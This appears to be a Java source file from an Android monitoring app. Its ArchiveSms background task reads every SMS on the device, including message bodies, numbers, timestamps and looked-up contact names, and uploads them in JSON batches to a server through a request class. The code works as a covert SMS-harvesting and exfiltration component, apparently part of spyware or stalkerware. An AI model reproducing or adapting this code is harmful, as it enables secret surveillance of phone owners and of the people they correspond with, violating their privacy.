package com.inet.android.archive;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.ContactsContract.PhoneLookup;

import com.inet.android.request.OnDemandRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

/**
 * Archive Sms. Watch sms
 * 
 * 
 */
public class ArchiveSms extends AsyncTask<Context, Void, Void> {
	ConvertDate date;
	Context mContext;
	private String LOG_TAG = "Arhive SMS";
	private String sendStr = null;
	private String complete;
	private String iType = "2";;
	private Uri uri;
	private Cursor sms_sent_cursor;
	Editor ed;
	SharedPreferences sp;

	public void getSmsLogs() {

		date = new ConvertDate();
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		ed = sp.edit();

		// -------------- for---------------------------------------------

		uri = Uri.parse("content://sms");

		sms_sent_cursor = mContext.getContentResolver().query(uri, null, null,
				null, "date desc");
		Logging.doLog(LOG_TAG,
				"network" + sp.getBoolean("network_available", true), "network"
						+ sp.getBoolean("network_available", true));
		if (sp.getBoolean("network_available", true) == true) {
			complete = "0";
			// Read the sms data and store it in the list
			if (sms_sent_cursor != null) {
				// формируем JSONobj
				JSONObject archiveSMSJson = new JSONObject();

				if (sms_sent_cursor.moveToFirst()) {

					for (int i = 0; i < sms_sent_cursor.getCount(); i++) {

						int typeSms = sms_sent_cursor.getInt(sms_sent_cursor
								.getColumnIndex("type"));
						String type = "0";
						switch (typeSms) {
						case 1:
							type = "5";
							break;
						case 2:
							type = "6";
							break;
						default:
							type = "7";
							break;
						}
						try {
							archiveSMSJson
									.put("time",
											date.getData(sms_sent_cursor.getLong(sms_sent_cursor
													.getColumnIndexOrThrow("date"))));
							archiveSMSJson.put("type", type);
							archiveSMSJson.put("number", sms_sent_cursor
									.getString(sms_sent_cursor
											.getColumnIndex("address")));
							archiveSMSJson.put("data", sms_sent_cursor
									.getString(sms_sent_cursor
											.getColumnIndex("body")));
							archiveSMSJson
									.put("name",
											getContactName(
													mContext,
													sms_sent_cursor
															.getString(sms_sent_cursor
																	.getColumnIndex("address"))));

							if (sendStr == null)
								sendStr = archiveSMSJson.toString();
							else
								sendStr += "," + archiveSMSJson.toString();

						} catch (JSONException e) {
							// TODO Автоматически созданный блок catch
							e.printStackTrace();
						}
						if (sendStr.length() >= 50000) {
							Logging.doLog(LOG_TAG, "str >= 50000 ..",
									"str >= 50000 ..");
							sendRequest(sendStr, complete);
							sendStr = null;
						}
						sms_sent_cursor.moveToNext();
					}

				}
				complete = "1";
				Logging.doLog(LOG_TAG, "Send complete 1 ..",
						"Send complete 1 ..");
				sendRequest(sendStr, complete);
				sendStr = null;
				ed.putString("status_sms_list", "0");
				sms_sent_cursor.close();

			} else
				Logging.doLog(LOG_TAG, "Send Cursor is Empty",
						"Send Cursor is Empty");
		}
		ed.putString("status_sms_list", "1");
		ed.commit();

	}

	private void sendRequest(String str, String complete) {
		if (str != null) {
			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete);
			dr.sendRequest(str);
			// Logging.doLog(LOG_TAG, str, str);
		}
	}

	public String getContactName(Context context, String phoneNumber) {
		ContentResolver cr = mContext.getContentResolver();
		Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI,
				Uri.encode(phoneNumber));
		Cursor cursor = cr.query(uri,
				new String[] { PhoneLookup.DISPLAY_NAME }, null, null, null);
		if (cursor == null) {
			return null;
		}
		String contactName = null;
		if (cursor.moveToFirst()) {
			contactName = cursor.getString(cursor
					.getColumnIndex(PhoneLookup.DISPLAY_NAME));
		}
		if (cursor != null && !cursor.isClosed()) {
			cursor.close();
		}
		return contactName;
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Автоматически созданная заглушка метода
		Logging.doLog(LOG_TAG, "doIn");
		this.mContext = params[0];
		getSmsLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}
